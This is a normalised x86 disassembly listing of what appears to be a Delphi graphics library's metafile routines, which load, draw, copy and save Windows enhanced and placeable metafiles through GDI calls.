mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_420560
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_420370
mov eax [ ebp - 0x8 ]
push eax
push sub_420488
push ebp
call sub_4204e4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4205a9
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41c670
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4205ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41fa5c
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_420634
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_42160c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414408
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_420664
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_42160c
mov edx esi
mov eax ebx
call sub_414434
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_421608
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_4206f8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_41e4e4
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_41e4e4
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_41e4e4
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_41e4e4
push eax
call SelectPalette
sub_420790
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420938
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_4061f4
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_4061f4
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_4207f4
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c670
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_420880
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420938
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_4061f4
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_4061f4
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_4208e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420e60
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415e7c
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_420a9c
mov edx esi
mov eax ebx
call sub_4209cc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_420938
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_42160c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_421608
pop esi
pop ebx
retn
sub_420960
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_420e60
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_420a9c
mov edx esi
mov eax ebx
call sub_4209cc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_4209cc
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_420938
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_4160a8
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026cc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_420a8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028c8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_4160a8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41e7d4
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a93
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026ec
retn
call sub_41e7d4
sub_420a9c
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_420938
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_41e7d4
lea eax [ ebp - 0x22 ]
call sub_41f624
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call sub_4061f4
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call sub_4061f4
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026cc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_420c0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41e7d4
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c12
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026ec
retn
call sub_41e7d4
sub_420c1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420cc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_420ca1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4085fc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c34c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404480
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41fd28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ca8
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_420cfc
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420938
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_4061f4
mov edx eax
mov eax ebx
call sub_420d70
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call sub_4061f4
mov edx eax
mov eax ebx
call sub_420d70
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_420d70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_420938
pop esi
pop ebx
retn
mov eax ebx
call sub_420ec0
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420dac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_420938
pop esi
pop ebx
retn
mov eax ebx
call sub_420ec0
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420dec
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420938
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_4061f4
mov edx eax
mov eax ebx
call sub_420dac
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call sub_4061f4
mov edx eax
mov eax ebx
call sub_420dac
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_420e60
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415e7c
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_420ec0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_420938
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_42160c
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_421608
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_420f44
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_415e7c
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_421050
mov edx ebx
mov eax esi
call sub_420fc4
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_420fc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421040
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4160e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026ec
retn
sub_421050
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402cbc
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_4160e0
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4160e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421172
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026ec
retn
call sub_41e834
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_4061f4
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_4061f4
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_41f624
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42118b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42116b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_421198
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_420938
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_41e7a4
sub_42121c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_4212ec
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4141e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42138a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421391
mov eax [ rw-data ]
call sub_414248
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_421362
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_42147c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41e3b8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413de4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41e35c
test al al
je r-xdata
sub_421398
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4141e4
mov esi eax
xor ecx ecx
push ebp
push sub_421408
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414248
retn
mov edx ebx
mov eax esi
call sub_413de4
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_42147c
sub_421414
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41dd3c
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_421450
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_42147c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41de00
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42147c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41e074
xor edx edx
push ebp
push sub_421510
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e564
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4141f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e3b8
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_42151c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41e074
xor eax eax
push ebp
push sub_4215fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422838
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_421398
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422938
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e564
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41415c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e3b8
retn
sub_42160c
push ebx
mov ebx eax
test ebx ebx
